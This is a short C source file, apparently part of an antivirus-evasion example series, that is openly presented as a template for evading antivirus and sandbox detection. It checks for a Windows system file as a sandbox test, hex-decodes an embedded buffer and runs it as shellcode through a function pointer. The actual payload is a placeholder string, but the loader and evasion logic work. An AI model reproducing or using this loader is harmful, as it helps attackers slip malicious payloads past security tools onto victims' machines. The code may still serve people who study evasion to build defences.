/*
Filename: fopen.c
Author: Daniel Sauder
Website: http://govolution.wordpress.com
License http://creativecommons.org/licenses/by-sa/3.0/
Purpose: example antivirus evasion with encrpytion and sandbox evasion
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <stdlib.h>

void exec_shellcode(unsigned char *shellcode)
{
  int (*funct)();
  funct = (int (*)()) shellcode;
  (int)(*funct)();
}

// return pointer to shellcode
unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
{
  int j=0;
  shellcode=malloc((size/2));

  int i=0;
  do
  {
    unsigned char temp[3]={0};
    sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
    shellcode[j] = strtoul(temp, NULL, 16);

    i+=2;
    j++;
  } while(i<size);

  return shellcode;
}


int main (int argc, char **argv)
{
	//unsigned char *buffer;
	unsigned char *shellcode;
	unsigned char buffer[]= "encoded shellcode";

	FILE *fp = fopen("c:\\windows\\system.ini", "rb");
	if (fp == NULL)
		return 0;
	fclose(fp);

	int size = sizeof(buffer);

	shellcode = decode_shellcode(buffer,shellcode,size);
	exec_shellcode(shellcode);
}
